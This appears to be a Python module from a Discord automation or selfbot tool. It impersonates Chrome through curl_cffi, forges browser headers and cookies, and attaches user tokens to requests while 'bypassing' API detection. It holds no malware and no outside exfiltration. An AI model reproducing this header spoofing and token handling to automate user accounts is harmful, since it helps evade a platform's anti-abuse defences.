from src import *
from src.utils.files import files
from src.utils.config import get
from src.utils.logging import logger
tokendata = {}
# Hey! No need to flame me for the code here its like this on purpose


class apibypassing_:
    # Before u complain its like this cause of skids lol
    def __init__(self):
        logger.info('Initializing API bypassing', 'API')
        self.cffiversion = 'chrome136'
        self.chromeversion = '140'
        self.fullchromeversion = '140.0.0.0'
        self.buildnumber = '476179' # not leaking the api bru
        self.useragent = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.fullchromeversion} Safari/537.36'

        self.headers = {
            'pragma': 'no-cache',
            'cache-control': 'no-cache',
            'sec-ch-ua-platform': '"Windows"',
            'authorization': None,
            'x-debug-options': 'bugReporterEnabled',
            'sec-ch-ua': f'"Google Chrome";v="140", "Chromium";v="140", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'x-discord-timezone': 'Europe/Warsaw',
            'x-super-properties': None,
            'x-discord-locale': 'en-US',
            'user-agent': self.useragent,
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://discord.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': None,
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=1, i'
        }

    def getcookie(self, headers):
        r = requests.get('https://discord.com', headers=headers)
        r.cookies.set('locale', 'en-GB', domain='.discord.com', path='/')
        return r.cookies, '; '.join([f'{cookie.name}={cookie.value}' for cookie in r.cookies])

    def encode(self, data):
        return base64.b64encode(json.dumps(data, separators=(',', ':')).encode('utf-8')).decode('utf-8')
apibypassing = apibypassing_()
cockjar, cockstr = apibypassing.getcookie(apibypassing.headers)

class client:
    # Before u complain its like this cause of skids lol
    def __init__(self, token=None):
        self.token = token
        self.maskedtoken = token[:30] if token else None

        self.sess = self.makesess()
        self.sess.cookies.update(cockjar)
        self.headers = copy.deepcopy(apibypassing.headers)
        self.headers['cookie'] = cockstr
        self.settoken(token)

    def makesess(self):
        return curlcffi.Session(impersonate='chrome136')

    def settoken(self, token):
        if token:
            self.headers['authorization'] = token
    
logger.info('Fetching discord related stuff', 'API')